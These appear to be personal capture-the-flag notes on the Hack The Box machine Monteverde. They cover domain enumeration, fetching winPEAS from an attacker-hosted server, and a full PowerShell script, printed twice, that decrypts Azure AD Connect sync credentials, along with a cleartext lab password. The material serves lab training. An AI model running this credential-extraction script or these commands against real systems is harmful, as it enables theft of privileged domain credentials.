
It's time for Bloodhound and Winpeas

Bloodhound
```
bloodhound-python -d MEGABANK.local -u mhope -p '4n0therD4y@n0th3r$' -ns 10.10.10.172 -c all
```

![[Pasted image 20240504002952.png]]

Started the Neo4j console and Run bloodhound


```
IWR -Uri http://10.10.16.20:8080//winpeas/winPEASx64.exe -OutFile winPEASx64.exe
```
![[Pasted image 20240504003704.png]]

Systeminfo
![[Pasted image 20240504013037.png]]

```
USERDOMAIN: MEGABANK
USERDNSDOMAIN: MEGABANK.LOCAL
```

![[Pasted image 20240504014452.png]]

If you recall that we have seen this account user name starting with AAD_ is used for actual sync service.
https://docs.microsoft.com/en-us/azure/active-directory/hybrid/concept-adsync-service-account

![[Pasted image 20240505041831.png]]

![[Pasted image 20240505041255.png]]


AD Sync 
![[Pasted image 20240505041505.png]]
So we see a Microsoft Azure AD Sync Folder 

We can enumerate the service instance using the Registry.
```
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```
![[Pasted image 20240505041916.png]]


```
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```
![[Pasted image 20240505043207.png]]

First i tried running this to know if it working cuz the tools we are going to use will extract the password dump from the AD as it's using DPAPI

```
secretsdump.py MEGABANK.LOCAL/mhope:'4n0therD4y@n0th3r$'@10.10.10.172 -use-vss
```
![[Pasted image 20240505042603.png]]

https://github.com/dirkjanm/adconnectdump
https://blog.xpnsec.com/azuread-connect-for-redteam/
If i recall it correct we have also used another tool written by this fella. (i.e. ldapdomain dump)

Let's try the tool
![[Pasted image 20240505044351.png]]

I don't know how to run the tool as it wants a file that we can decrypt using this tool.
```
/root/HackTheBox/Monterverde/adconnectdump/decrypt.py
```


```
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```
![[Pasted image 20240505045617.png]]

```
instance_id: 1852B527-DD4F-4ECF-B541-EFCCBFF29E31
keyset_id: 1
entropy: 194EC2FC-F186-46CF-B44D-071EB61F49CD
```

Changes:
```
$keyset_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
```

Now will save the script adconnect.ps1
```
Function Get-ADConnectPassword{
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
$keyset_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList
"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM
mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName
Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']"
| select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']"
| select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name =
'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
}
```


```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```


Let's see the Private_configuration
```
sqlcmd -Q "Use ADSync; select private_configuration_xml FROM mms_management_Agent"
```
![[Pasted image 20240505154724.png]]

Will the in memory command
```
evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172 -s .
```
As we are getting the error yesterday so we need to replace some code as we are not able to the get the SQL connection.

![[Pasted image 20240505160023.png]]

![[Pasted image 20240505160411.png]]
We are getting the error on the 2nd line where the client is trying to open the connection.
Let's find another way to do that.


On googling it we found this
```
new-object system.data.sqlclient.sqlconnection
```
https://www.sqlshack.com/connecting-powershell-to-sql-server/

Before
```
-ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
```

After
```
Server=localhost;Integrated Security=true;Initial Catalog=ADSync
```
![[Pasted image 20240505160814.png]]

Now the code is running aka connection is established
![[Pasted image 20240505161134.png]]


```

```